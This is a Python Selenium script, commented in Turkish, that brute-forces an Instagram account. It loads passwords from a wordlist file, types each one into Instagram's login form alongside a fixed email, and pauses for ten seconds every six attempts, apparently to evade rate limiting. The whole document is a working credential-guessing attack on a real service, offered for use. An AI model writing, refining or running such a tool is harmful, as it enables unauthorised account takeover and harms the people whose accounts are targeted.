from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time as t

# userInfo dosyasından email ve password'ü içeri aktar
from userInfo import email, password

# Instagram sınıfını tanımla
class Instagram:
    # İnitializer (yapıcı) fonksiyon, email ve password alır
    def __init__(self, email, password):
        # Firefox tarayıcısını başlat
        self.browser = webdriver.Firefox()
        # email ve password'ü sınıf özelliklerine kaydet
        self.email = email
        self.password = password

    # Giriş yapma fonksiyonunu tanımla
    def signIn(self):
        # Instagram giriş sayfasını aç
        self.browser.get("https://www.instagram.com/accounts/login/")
        # 3 saniye bekle (tarayıcının yüklenmesi için)
        t.sleep(3)

        dosya_yolu = "wordlist.txt"

        with open(dosya_yolu, "r") as dosya:
            satirlar = dosya.readlines()

        # Counter for login attempts
        login_attempts = 0

        for satir in satirlar:
            kelime_adi = satir.strip()
            # Parolayı güncelle
            self.password = kelime_adi

            # Kullanıcı adı giriş alanını bul ve email'i kullanarak tanımla
            email_input = self.browser.find_element(By.XPATH, "//input[@name='username']")
            # Parola giriş alanını bul ve password'u kullanarak tanımla
            password_input = self.browser.find_element(By.XPATH, "//input[@name='password']")

            # Email'i email giriş alanına gönder
            email_input.send_keys(self.email)
            # Password'u password giriş alanına gönder
            password_input.send_keys(self.password)
            # Enter tuşunu göndererek giriş yapmayı dene
            password_input.send_keys(Keys.ENTER)

            t.sleep(1 / 5)
            # Kullanıcı adı ve şifreyi temizle
            email_input.clear()
            password_input.clear()

            # Increment login attempts
            login_attempts += 1

            # Check if 6 attempts reached, then wait for 10 seconds
            if login_attempts % 6 == 0:
                print(f"Waiting for 10 seconds after {login_attempts} attempts...")
                t.sleep(10)

# Instagram sınıfını oluştur ve her satır için giriş yapmayı dene
instgrm = Instagram(email, password)
instgrm.signIn()
